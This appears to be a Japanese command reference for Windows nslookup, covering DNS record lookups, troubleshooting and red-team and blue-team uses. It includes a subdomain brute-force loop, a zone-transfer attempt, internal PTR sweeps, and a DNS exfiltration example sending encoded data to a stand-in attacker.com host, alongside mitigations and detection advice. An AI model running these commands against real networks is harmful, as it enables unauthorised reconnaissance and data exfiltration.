# Command - Windows - cmd - nslookup - DNS情報のクエリとデバッグ

## 概要

`nslookup` (Name System Lookup) は、DNS (Domain Name System) サーバーに対してクエリを送信し、ドメイン名から IP アドレス、またはその逆の情報を取得するためのツールです。
対話モードと非対話モードの2つのモードを持ち、Aレコードだけでなく MX (メール) や TXT (テキスト) など、あらゆる DNS レコードを確認できます。

(出自: `Windows 標準搭載 - TCP/IP ユーティリティ`)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 (あれば) |
| :--- | :--- | :--- |
| `dig` | Linux の標準。出力が詳細で、スクリプトとの親和性が極めて高い。 | (Linux環境) |
| `Resolve-DnsName` | PowerShell 版。オブジェクトを返し、DNSSEC や詳細な検証結果を取得可能。 | PS 環境 |

## よく連携されるコマンド

### シナリオ例: サブドメインの総当たり (偵察視点)

* **目的**: ターゲットドメインに存在する可能性のあるサブドメイン (dev, mail, vpn等) を一括で調査する。
* **連携コマンド**: `for`, `nslookup`, `findstr`
* **解説**: 事前に用意した単語リスト (wordlist) を読み込み、順次クエリを投げ、IPが返ってきたものだけを抽出します。
* **コマンド例**:
    ```cmd
    REM 単語リストをループさせ、応答があったサブドメインのみを表示
    for /f %i in (subdomains.txt) do @nslookup %i.example.com 2>nul | findstr "Address" && echo %i.example.com found!
    ```



## スイッチ/オプション説明

非対話モード（コマンドライン引数）と、対話モード（起動後のコマンド）で使い分けます。

| オプション / コマンド | 説明 |
| :--- | :--- |
| **基本（非対話）** | |
| `nslookup <host>` | 指定したホストの IP アドレスを検索（標準の DNS サーバー使用）。 |
| `nslookup <host> <server>` | **【重要】** 指定した特定の DNS サーバーを使用して検索する。 |
| **対話モード内設定** | |
| `set type=<record>` | クエリするレコード型を指定（A, MX, PTR, NS, TXT, SOA, ANY）。 |
| `set q=<record>` | `set type` と同義。 |
| `set debug` | 詳細なパケット情報（ヘッダや TTL 等）を表示する。 |
| `ls -d <domain>` | **【レッドチーム最重要】** ゾーン転送 (AXFR) を試行する。 |

## よく使われる組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: 新設したメールサーバーが正しく世界から参照できるか確認する。
* **解説**: `MX` レコードを確認し、優先順位とホスト名が意図通りかチェックします。
* **例**:
    ```cmd
    REM example.com のメールサーバー設定を確認
    nslookup -type=MX example.com
    ```

### 2. ブルーチーム視点

* **タスク**: DNS ハイジャックの検知や、SPF/DKIM/DMARC 設定の不備を確認する。
* **解説**: `TXT` レコードを調査し、なりすまし対策の設定が正しく記述されているか監査します。
* **例**:
    ```cmd
    REM SPFレコード（送信元制限）の記述を確認
    nslookup -type=TXT example.com
    ```

### 3. レッドチーム視点 (偵察と列挙)

* **タスク 1: DNS Zone Transfer (AXFR) の試行**
    * **目的**: 不適切に設定された DNS サーバーから、そのドメインに登録されている全ホスト情報を一括取得する。
    * **解説**: 本来、ゾーン転送はセカンダリサーバーに対してのみ許可すべきですが、設定ミスで誰にでも許可されている場合があります。
    * **コマンド例**:
        ```cmd
        nslookup
        > server <Target_DNS_IP>
        > set type=any
        > ls -d example.com
        ```


* **タスク 2: PTRレコード (逆引き) による内部探索**
    * **目的**: 特定の IP 範囲にどのような名前のサーバーがいるかを確認する。
    * **解説**: サーバー名に `dc01` や `backup-srv` といった名前が付いていれば、攻撃の優先順位を決められます。
    * **コマンド例**:
        ```cmd
        REM IPアドレスからホスト名を特定
        nslookup -type=PTR 192.168.1.10
        ```

* **タスク 3: DNS Exfiltration の確認**
    * **目的**: 通信制限を回避するために DNS クエリにデータを乗せていないか調査する。
    * **解説**: 異常に長いサブドメイン名や、ランダムな文字列のクエリが大量に発生していないか確認します。

## エラーメッセージとトラブルシューティング

1.  **Non-existent domain (非共存ドメイン)**
    * **原因**: 指定したドメイン名が存在しない、または名前解決できていない。
    * **対応**: スペルミス、または参照している DNS サーバー自体が正しいか確認。

2.  **Can't find <host>: No answer**
    * **原因**: サーバーは存在するが、指定したレコード型（MX等）が登録されていない。

3.  **Query refused**
    * **原因**: サーバーがクエリを拒否した。ゾーン転送試行時に出ることが多い。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **情報漏洩 (DNS Reconnaissance / T1590.002):**
    * **内部構造の特定**: サブドメインの列挙により、`dev`, `test`, `staging`, `vpn`, `backup` などの文字列から、組織のネットワーク構成、未公開のサービス、開発環境の所在を特定されます。
    * **ネーミングコンベンションの推測**: ホスト名（例: `TYO-DC-01`, `OSK-SQL-02`）から、拠点の場所、サーバーの役割、OSのバージョンなどが推測可能です。
    * **Active Directory の探索 (SRV Record)**: `_ldap._tcp.dc._msdcs.<Domain>` などの SRV レコードをクエリすることで、ドメインコントローラの IP アドレスを正確に特定でき、その後のパスワードスプレー攻撃や脆弱性調査の標的が定まります。

* **DNS ゾーン転送 (AXFR) の悪用 (T1590.001):**
    * **悪用シナリオ**: 本来セカンダリ DNS サーバーとの同期に使用される `AXFR` 要求を攻撃者が送信。設定ミスで許可されている場合、そのドメイン内の**全ホスト名、IPアドレス、コメント、TXTレコード（クラウドサービスの認証トークンが含まれることもある）**を一度に窃取されます。

* **DNS トンネリングとデータ漏洩 (Exfiltration Over DNS / T1048.003):**
    * **悪用シナリオ**: ほとんどのファイアウォールは DNS (UDP 53) を制限なく許可している点を利用します。攻撃者は、漏洩させたいデータをエンコード（Base64等）し、`nslookup <Encoded_Data>.attacker.com` のようにサブドメイン部分に含めてクエリを投げます。攻撃側の権威サーバーはこのログを解析することで、TCP接続を確立せずにデータを回収できます。

### LOLBAS (Living Off The Land Binaries and Scripts) における利用例

* **機能**: `Reconnaissance` (偵察), `Data Exfiltration` (データ持ち出し)
* **悪用手法**: 外部への直接的な HTTP/HTTPS 通信が遮断されている「エアギャップ」に近い環境であっても、`nslookup` を介した DNS クエリによって、コマンドの結果やシステム情報を小分けにして外部へ送信するスクリプトが作成されることがあります。
* **参照**: [LOLBAS - nslookup.exe](https://lolbas-project.github.io/lolbas/Binaries/Nslookup/)

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**:
    * **ゾーン転送の制限**: ゾーン転送を許可する IP アドレスを、信頼できるセカンダリ DNS サーバーのみに厳格に制限する（`Allow-transfer { <Secondary_IP>; };`）。
    * **スプリットホライズン DNS (Split-DNS)**: 外部（インターネット）用と内部（イントラネット）用の DNS サーバーを分離し、外部から内部限定のホスト名（例: ファイルサーバーや AD）が解決されないように設計する。
    * **TXT レコードの整理**: 公開 DNS の TXT レコードに、古いサービスの設定や機密性の高いトークンが残っていないか定期的に監査する。

* **Detection (検知)**:
    * **異常なクエリボリュームの監視**: 特定のソースから短時間に数千件のサブドメイン解決が行われている（DNS Bruteforce / Fuzzing）場合を検知する。
    * **クエリの長さと頻度の監視**: `A` や `TXT` レコードに対して、人間が読めない長いランダムな文字列が含まれるクエリ（DNS Tunneling）を SIEM で検知し、C2 通信を特定する。
    * **AXFR 要求のログ監視**: セカンダリサーバー以外からの `ls -d` (AXFR) 要求が発生した場合、即座に重大な侵害予兆としてアラートを発報する。
